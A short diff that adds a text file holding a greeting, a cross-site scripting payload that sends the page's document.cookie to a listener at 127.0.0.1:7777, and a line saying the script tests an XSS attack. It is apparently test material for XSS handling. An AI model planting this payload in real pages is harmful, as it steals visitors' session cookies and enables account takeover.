@@ -1,0 +1,4 @@
+Hello Folks,
+<script>document.write("<img src='http://127.0.0.1:7777?cookie=" + escape(document.cookie) + "'>");</script>
+This script tests an XSS attack.
+
